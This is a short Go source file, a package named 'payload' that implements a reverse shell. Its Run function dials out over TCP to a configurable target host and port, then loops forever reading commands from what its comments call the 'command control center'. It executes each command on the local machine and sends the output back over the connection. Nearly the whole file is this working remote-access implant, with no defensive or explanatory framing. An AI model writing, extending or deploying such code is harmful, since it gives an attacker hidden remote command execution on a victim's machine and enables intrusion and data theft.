package payload

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"
)

// BufferSize is the amount of bytes being recevied from the server
// when uploading a file
const BufferSize = 1024

// Payload needs description
type Payload struct {
	Port   int
	Target string
	Conn   net.Conn
}

// Run executes the payload
func (p *Payload) Run() {
	addr := p.Target + ":" + strconv.Itoa(p.Port)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Println("[ERROR] dialing connection", err)
	}
	defer conn.Close()

	p.Conn = conn

	for {
		// Wait for a message from the command control center
		p.executeCommand()
	}
}

func (p *Payload) executeCommand() {
	// read the incoming message
	msg, err := bufio.NewReader(p.Conn).ReadString('\r')
	if err != nil {
		p.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
		return
	}

	// fmsg is the full message. since commandByteBuffer read the first 2 bytes
	// and this is not a special command we need those 2 bytez so we add it to the remaing
	// message from the server
	// fmsg := string(commandByteBuffer) + msg

	// Prepare the command line argument we are going to call
	cmdArgs := strings.Split(strings.TrimSpace(msg), " ")
	mcmd := cmdArgs[0]
	cmdArgs = append(cmdArgs[:0], cmdArgs[0+1:]...)

	// execute the command line argument
	cmd := exec.Command(mcmd, cmdArgs...)
	output, err := cmd.Output()
	if err != nil {
		// let the server know we could not execute the command
		p.Conn.Write([]byte("Failed command: " + err.Error() + " \n\r"))
		return
	}
	// send back the command output to the server
	p.Conn.Write([]byte(string(output) + "\r"))
}
